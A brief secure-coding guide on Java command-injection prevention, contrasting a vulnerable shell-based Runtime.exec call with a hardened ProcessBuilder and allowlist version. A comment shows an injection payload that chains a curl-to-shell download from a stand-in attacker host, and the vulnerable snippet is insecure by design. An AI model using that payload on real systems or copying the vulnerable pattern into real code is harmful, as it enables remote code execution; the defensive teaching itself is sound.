Command & OS Injection Prevention

Passing user input to a shell interpreter (sh -c or cmd.exe /c) enables command chaining via ;, &&, or backticks. Prefer native Java libraries; if an external binary is unavoidable, invoke ProcessBuilder with an explicit argument list and validate against a strict allowlist.

// VULNERABLE: Invoking a shell allows '; curl attacker.com/shell.sh | sh'
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ping -c 1 " + userHost});

// HARDENED: Validate against a strict pattern and pass arguments as separate tokens (no shell)
private static final Pattern HOST_ALLOWLIST = Pattern.compile("^[a-zA-Z0-9.-]{1,64}$");

public int pingHostSafely(String host) throws IOException, InterruptedException {
    if (!HOST_ALLOWLIST.matcher(host).matches()) {
        throw new IllegalArgumentException("Invalid hostname");
    }
    ProcessBuilder pb = new ProcessBuilder("/usr/bin/ping", "-c", "1", "--", host);
    pb.redirectErrorStream(true);
    Process process = pb.start();
    return process.waitFor();
}
